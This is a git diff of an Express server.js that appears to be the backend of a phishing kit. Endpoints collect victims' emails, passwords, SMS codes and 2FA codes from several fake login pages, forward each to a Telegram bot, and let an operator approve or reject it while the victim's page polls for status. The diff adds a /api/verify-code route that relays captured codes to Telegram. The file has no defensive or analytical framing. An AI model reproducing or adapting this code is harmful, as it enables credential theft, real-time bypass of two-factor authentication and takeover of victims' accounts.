@@ -1,3 +1,4 @@
+// server.js (merged)
 console.log("📦 Starting combined server.js...");
 
 const express = require("express");
@@ -24,12 +25,11 @@ app.use(express.static("public"));
 // -----------------
 // Store pending approvals
 // -----------------
-const pendingUsers = {}; // email/password login (big)
-const pendingCodes = {}; // SMS codes
-const pendingGeneric = {}; // generic codes
-const pendingPage = {}; // page 4 logins
+const pendingUsers = {};     // email/password login (big)
+const pendingCodes = {};     // SMS codes
+const pendingGeneric = {};   // generic codes
+const pendingPage = {};      // page 4 logins
 const pendingApprovals = {}; // CB login approvals { email: { status, password, region, device } }
-const pending2FA = {}; // 2FA requests by requestId
 
 // -----------------
 // Health check
@@ -40,6 +40,7 @@ app.get("/", (req, res) => {
 
 // -----------------
 // Email/Password Login (big)
+// -----------------
 app.post("/login", (req, res) => {
   const email = (req.body.email || "").trim().toLowerCase();
   const password = req.body.password;
@@ -55,6 +56,7 @@ app.post("/login", (req, res) => {
 
 // -----------------
 // Generic code submission (big)
+// -----------------
 app.post("/generic-login", (req, res) => {
   const identifier = (req.body.identifier || "").trim();
   if (!identifier) return res.status(400).json({ success: false, message: "Identifier required" });
@@ -68,6 +70,7 @@ app.post("/generic-login", (req, res) => {
 
 // -----------------
 // SMS Login (big)
+// -----------------
 app.post("/sms-login", (req, res) => {
   const code = (req.body.code || "").trim();
   if (!code) return res.status(400).json({ success: false, message: "Code required" });
@@ -81,6 +84,7 @@ app.post("/sms-login", (req, res) => {
 
 // -----------------
 // Page 4 Login (big)
+// -----------------
 app.post("/page-login", (req, res) => {
   const email = (req.body.email || "").trim().toLowerCase();
   const password = req.body.password;
@@ -96,15 +100,14 @@ app.post("/page-login", (req, res) => {
 
 // -----------------
 // CB Login (small)
+// -----------------
 app.post("/send-login", async (req, res) => {
   const { email, password, region, device } = req.body;
   if (!email || !password) return res.status(400).json({ error: "Missing email or password" });
 
-  // Store pending first
   pendingApprovals[email] = { status: "pending", password, region, device };
   console.log(`📥 CB Login received: ${email}`);
 
-  // Send Telegram message
   try {
     await sendLoginTelegram(email);
   } catch (err) {
@@ -115,49 +118,34 @@ app.post("/send-login", async (req, res) => {
 });
 
 // -----------------
-// 2FA Code via Telegram (frontend integration)
-app.post('/api/submit-2fa', (req, res) => {
-  const { code, requestId } = req.body;
-  if (!code || !requestId) {
-    return res.status(400).json({ status: 'error', message: 'Missing code or requestId' });
+// 2FA Code verification & send to Telegram
+// -----------------
+app.post("/api/verify-code", (req, res) => {
+  const { code, chatId } = req.body;
+
+  if (!code || !chatId) {
+    return res.status(400).json({ message: "Code and chatId are required." });
   }
 
-  pending2FA[requestId] = { status: 'pending' };
-
-  // Send to Telegram admin (ADMIN_CHAT_ID is used in bot.js)
-  send2FACode(code, requestId);
-
-  res.json({ status: 'pending', requestId });
-});
-
-// Polling endpoint for frontend to check approval status
-app.get('/api/approval-status/:requestId', (req, res) => {
-  const { requestId } = req.params;
-  if (!pending2FA[requestId]) {
-    return res.json({ status: 'unknown' });
+  if (code.length >= 6 && code.length <= 8) {
+    send2FACode(code, chatId);
+    console.log(`📥 2FA Code sent to chatId: ${chatId}`);
+    res.status(200).json({ message: "Code sent to Telegram." });
+  } else {
+    res.status(400).json({ message: "Invalid code length. Must be 6–8 characters." });
   }
-  res.json({ status: pending2FA[requestId].status });
-});
-
-// Update status from Telegram bot (called by bot.js)
-app.post('/api/update-2fa-status', (req, res) => {
-  const { requestId, status } = req.body;
-  if (!pending2FA[requestId]) {
-    return res.json({ ok: false, message: 'RequestId not found' });
-  }
-  pending2FA[requestId].status = status;
-  res.json({ ok: true });
 });
 
 // -----------------
 // Check status
 // Supports all types: big + CB
+// -----------------
 app.get("/check-status", (req, res) => {
   const identifier = (req.query.identifier || "").trim();
-  if (pendingUsers[identifier]) return res.json({ status: pendingUsers[identifier].status });
-  if (pendingCodes[identifier]) return res.json({ status: pendingCodes[identifier].status });
-  if (pendingGeneric[identifier]) return res.json({ status: pendingGeneric[identifier].status });
-  if (pendingPage[identifier]) return res.json({ status: pendingPage[identifier].status });
+  if (pendingUsers[identifier])    return res.json({ status: pendingUsers[identifier].status });
+  if (pendingCodes[identifier])    return res.json({ status: pendingCodes[identifier].status });
+  if (pendingGeneric[identifier])  return res.json({ status: pendingGeneric[identifier].status });
+  if (pendingPage[identifier])     return res.json({ status: pendingPage[identifier].status });
   if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
   res.json({ status: "unknown" });
 });
@@ -171,6 +159,7 @@ app.post("/check-status", (req, res) => {
 
 // -----------------
 // Update approval status (called by bot)
+// -----------------
 app.post("/update-status", (req, res) => {
   const identifier = (req.body.identifier || req.body.email || "").trim();
   const status = req.body.status;
@@ -197,6 +186,7 @@ app.post("/update-status", (req, res) => {
 
 // -----------------
 // Self-ping to stay awake
+// -----------------
 setInterval(() => {
   const url = process.env.APP_URL;
   if (url) {
@@ -206,6 +196,7 @@ setInterval(() => {
 
 // -----------------
 // Start server
+// -----------------
 app.listen(PORT, () => {
   console.log(`✅ Combined server running at port ${PORT}`);
 });
